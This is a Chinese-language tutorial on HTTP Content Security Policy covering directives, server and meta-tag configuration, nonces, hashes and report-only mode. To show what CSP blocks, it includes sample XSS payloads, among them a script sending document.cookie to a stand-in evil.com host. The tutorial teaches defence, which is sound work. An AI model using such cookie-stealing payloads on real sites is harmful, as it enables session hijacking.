---
title: http 中 CSP 是什么
category: 网络
difficulty: 中级
updatedAt: 2025-11-28
summary: >-
  深入理解内容安全策略（CSP）机制，掌握如何通过 CSP 防止 XSS 攻击和其他代码注入攻击
tags:
  - HTTP
  - 安全
  - CSP
  - XSS防护
estimatedTime: 25 分钟
keywords:
  - CSP
  - Content Security Policy
  - XSS
  - 安全策略
highlight: CSP 是防御 XSS 攻击的重要安全机制，通过限制资源加载来源保护网站安全
order: 26
---

## 问题 1：什么是 CSP？

CSP（Content Security Policy，内容安全策略）是一种额外的安全层，用于检测并削弱某些特定类型的攻击，包括跨站脚本攻击（XSS）和数据注入攻击。

### CSP 的工作原理

```javascript
// 服务器通过响应头设置 CSP 策略
HTTP/1.1 200 OK
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.com

// 浏览器会根据策略限制资源加载：
// ✅ 允许：从同源和 trusted.com 加载脚本
// ❌ 阻止：从其他来源加载脚本
// ❌ 阻止：内联脚本（如 <script>alert('xss')</script>）
// ❌ 阻止：eval() 等危险函数
```

### 没有 CSP 的安全隐患

```html
<!-- ❌ 没有 CSP 时，XSS 攻击可以轻易执行 -->

<!-- 攻击者注入的恶意脚本 -->
<script>
  // 窃取用户 Cookie
  fetch('https://evil.com/steal?cookie=' + document.cookie);
</script>

<!-- 从恶意网站加载脚本 -->
<script src="https://evil.com/malicious.js"></script>

<!-- 内联事件处理器 -->
<img src="x" onerror="alert('XSS')">
```

### 有 CSP 的保护

```javascript
// ✅ 启用 CSP 后
Content-Security-Policy: default-src 'self'; script-src 'self'

// 浏览器会阻止：
// ❌ 内联脚本
<script>alert('XSS')</script>  // 被阻止

// ❌ 外部恶意脚本
<script src="https://evil.com/bad.js"></script>  // 被阻止

// ❌ 内联事件处理器
<img src="x" onerror="alert('XSS')">  // 被阻止

// ❌ eval() 等危险函数
eval('alert("XSS")')  // 被阻止

// ✅ 只允许同源脚本
<script src="/js/app.js"></script>  // 允许
```

---

## 问题 2：如何配置 CSP？

### CSP 指令说明

```javascript
// 常用的 CSP 指令

// default-src: 默认策略，作为其他指令的后备
Content-Security-Policy: default-src 'self'

// script-src: 控制 JavaScript 来源
Content-Security-Policy: script-src 'self' https://trusted.com

// style-src: 控制 CSS 来源
Content-Security-Policy: style-src 'self' 'unsafe-inline'

// img-src: 控制图片来源
Content-Security-Policy: img-src 'self' data: https:

// font-src: 控制字体来源
Content-Security-Policy: font-src 'self' https://fonts.gstatic.com

// connect-src: 控制 AJAX、WebSocket 等连接
Content-Security-Policy: connect-src 'self' https://api.example.com

// frame-src: 控制 iframe 来源
Content-Security-Policy: frame-src 'none'

// object-src: 控制 <object>、<embed> 等
Content-Security-Policy: object-src 'none'
```

### 配置方式

**1. 通过 HTTP 响应头**

```javascript
// Node.js Express
app.use((req, res, next) => {
  res.setHeader(
    'Content-Security-Policy',
    "default-src 'self'; script-src 'self' https://cdn.example.com; style-src 'self' 'unsafe-inline'"
  );
  next();
});
```

```nginx
# Nginx 配置
add_header Content-Security-Policy "default-src 'self'; script-src 'self' https://cdn.example.com";
```

**2. 通过 HTML meta 标签**

```html
<!DOCTYPE html>
<html>
<head>
  <meta http-equiv="Content-Security-Policy" 
        content="default-src 'self'; script-src 'self' https://cdn.example.com">
</head>
<body>
  <!-- 页面内容 -->
</body>
</html>
```

### CSP 值的类型

```javascript
// 'none' - 不允许任何来源
Content-Security-Policy: script-src 'none'

// 'self' - 只允许同源
Content-Security-Policy: script-src 'self'

// 特定域名
Content-Security-Policy: script-src https://trusted.com

// 通配符子域
Content-Security-Policy: script-src https://*.example.com

// 'unsafe-inline' - 允许内联脚本（不推荐）
Content-Security-Policy: script-src 'self' 'unsafe-inline'

// 'unsafe-eval' - 允许 eval()（不推荐）
Content-Security-Policy: script-src 'self' 'unsafe-eval'

// nonce - 允许特定的内联脚本
Content-Security-Policy: script-src 'nonce-random123'

// hash - 允许特定内容的内联脚本
Content-Security-Policy: script-src 'sha256-abc123...'
```

---

## 问题 3：如何使用 nonce 和 hash 允许内联脚本？

### 使用 nonce

nonce（number used once）是一个随机数，用于标识允许执行的内联脚本。

```javascript
// 服务器端生成随机 nonce
const crypto = require('crypto');

app.get('/', (req, res) => {
  // 生成随机 nonce
  const nonce = crypto.randomBytes(16).toString('base64');
  
  // 设置 CSP 响应头
  res.setHeader(
    'Content-Security-Policy',
    `script-src 'self' 'nonce-${nonce}'`
  );
  
  // 渲染 HTML，将 nonce 传递给模板
  res.render('index', { nonce });
});
```

```html
<!-- HTML 模板 -->
<!DOCTYPE html>
<html>
<head>
  <title>CSP Nonce Example</title>
</head>
<body>
  <!-- ✅ 带有正确 nonce 的脚本可以执行 -->
  <script nonce="<%= nonce %>">
    console.log('This script is allowed');
  </script>
  
  <!-- ❌ 没有 nonce 的脚本会被阻止 -->
  <script>
    console.log('This script is blocked');
  </script>
  
  <!-- ❌ 错误的 nonce 也会被阻止 -->
  <script nonce="wrong-nonce">
    console.log('This script is also blocked');
  </script>
</body>
</html>
```

### 使用 hash

hash 允许特定内容的内联脚本执行。

```javascript
// 1. 计算脚本内容的 hash
const crypto = require('crypto');
const scriptContent = "console.log('Hello World');";
const hash = crypto
  .createHash('sha256')
  .update(scriptContent)
  .digest('base64');

console.log(hash); // 例如: "abc123def456..."

// 2. 设置 CSP 响应头
res.setHeader(
  'Content-Security-Policy',
  `script-src 'self' 'sha256-${hash}'`
);
```

```html
<!-- ✅ 内容匹配 hash 的脚本可以执行 -->
<script>console.log('Hello World');</script>

<!-- ❌ 内容不匹配的脚本会被阻止 -->
<script>console.log('Different content');</script>
```

### nonce vs hash 的选择

```javascript
// nonce 的优势：
// - 每次请求生成新的随机值，更安全
// - 适合动态内容
// - 不需要提前知道脚本内容

// hash 的优势：
// - 不需要服务器动态生成
// - 适合静态内容
// - 可以在构建时计算

// 推荐使用 nonce，特别是对于服务器渲染的页面
```

---

## 问题 4：CSP 的报告模式和实际应用

### 报告模式（Report-Only）

在正式启用 CSP 前，可以使用报告模式来测试策略。

```javascript
// 使用 Content-Security-Policy-Report-Only
// 违规行为只会报告，不会被阻止
res.setHeader(
  'Content-Security-Policy-Report-Only',
  "default-src 'self'; report-uri /csp-report"
);
```

```javascript
// 接收 CSP 违规报告
app.post('/csp-report', express.json({ type: 'application/csp-report' }), (req, res) => {
  const report = req.body;
  console.log('CSP Violation:', JSON.stringify(report, null, 2));
  
  // 报告内容示例：
  // {
  //   "csp-report": {
  //     "document-uri": "https://example.com/page",
  //     "violated-directive": "script-src",
  //     "blocked-uri": "https://evil.com/bad.js",
  //     "original-policy": "default-src 'self'"
  //   }
  // }
  
  // 可以将报告发送到日志系统或监控平台
  logToMonitoring(report);
  
  res.status(204).end();
});
```

### 实际应用示例

```javascript
// 完整的 CSP 配置示例
const cspConfig = {
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: [
      "'self'",
      "'nonce-{{nonce}}'", // 使用 nonce
      "https://cdn.jsdelivr.net",
      "https://unpkg.com"
    ],
    styleSrc: [
      "'self'",
      "'unsafe-inline'", // 允许内联样式（如果需要）
      "https://fonts.googleapis.com"
    ],
    imgSrc: [
      "'self'",
      "data:", // 允许 data: URL
      "https:", // 允许所有 HTTPS 图片
      "blob:" // 允许 blob: URL
    ],
    fontSrc: [
      "'self'",
      "https://fonts.gstatic.com"
    ],
    connectSrc: [
      "'self'",
      "https://api.example.com",
      "wss://websocket.example.com"
    ],
    frameSrc: ["'none'"], // 禁止 iframe
    objectSrc: ["'none'"], // 禁止 object、embed
    baseUri: ["'self'"], // 限制 <base> 标签
    formAction: ["'self'"], // 限制表单提交目标
    frameAncestors: ["'none'"], // 防止被嵌入 iframe
    upgradeInsecureRequests: [] // 自动升级 HTTP 到 HTTPS
  }
};

// 使用 helmet 中间件简化配置
const helmet = require('helmet');

app.use(
  helmet.contentSecurityPolicy({
    directives: cspConfig.directives
  })
);
```

### 常见场景的 CSP 配置

```javascript
// 1. 纯静态网站
Content-Security-Policy: default-src 'self'

// 2. 使用 CDN 的网站
Content-Security-Policy: 
  default-src 'self'; 
  script-src 'self' https://cdn.example.com; 
  style-src 'self' https://cdn.example.com

// 3. 使用 Google Analytics 的网站
Content-Security-Policy: 
  default-src 'self'; 
  script-src 'self' https://www.google-analytics.com; 
  img-src 'self' https://www.google-analytics.com

// 4. 使用内联样式的网站
Content-Security-Policy: 
  default-src 'self'; 
  style-src 'self' 'unsafe-inline'

// 5. 开发环境（较宽松）
Content-Security-Policy: 
  default-src 'self' 'unsafe-inline' 'unsafe-eval'; 
  script-src 'self' 'unsafe-inline' 'unsafe-eval'
```

### 调试 CSP

```javascript
// 在浏览器控制台查看 CSP 违规
// Chrome/Firefox 会显示详细的错误信息：
// "Refused to load the script 'https://evil.com/bad.js' 
//  because it violates the following Content Security Policy directive..."

// 使用 CSP Evaluator 工具检查策略
// https://csp-evaluator.withgoogle.com/

// 逐步收紧策略
// 1. 从 Report-Only 模式开始
// 2. 收集违规报告
// 3. 调整策略
// 4. 切换到强制模式
// 5. 继续监控和优化
```

---

## 总结

**核心概念总结**：

### 1. CSP 的作用

- 防止 XSS 攻击和代码注入
- 限制资源加载来源
- 提供额外的安全防护层

### 2. CSP 指令

- `default-src`：默认策略
- `script-src`：JavaScript 来源
- `style-src`：CSS 来源
- `img-src`：图片来源
- `connect-src`：网络连接来源
- `frame-src`：iframe 来源

### 3. 允许内联脚本的方法

- **nonce**：随机数标识，每次请求生成
- **hash**：内容哈希，适合静态内容
- **unsafe-inline**：允许所有内联（不推荐）

### 4. 最佳实践

- 从 Report-Only 模式开始测试
- 避免使用 `unsafe-inline` 和 `unsafe-eval`
- 使用 nonce 或 hash 允许必要的内联脚本
- 定期审查和更新 CSP 策略
- 监控 CSP 违规报告

## 延伸阅读

- [MDN - Content Security Policy](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP)
- [Google - CSP 介绍](https://developers.google.com/web/fundamentals/security/csp)
- [CSP Evaluator](https://csp-evaluator.withgoogle.com/)
- [Content Security Policy Reference](https://content-security-policy.com/)
- [OWASP - Content Security Policy](https://owasp.org/www-community/controls/Content_Security_Policy)
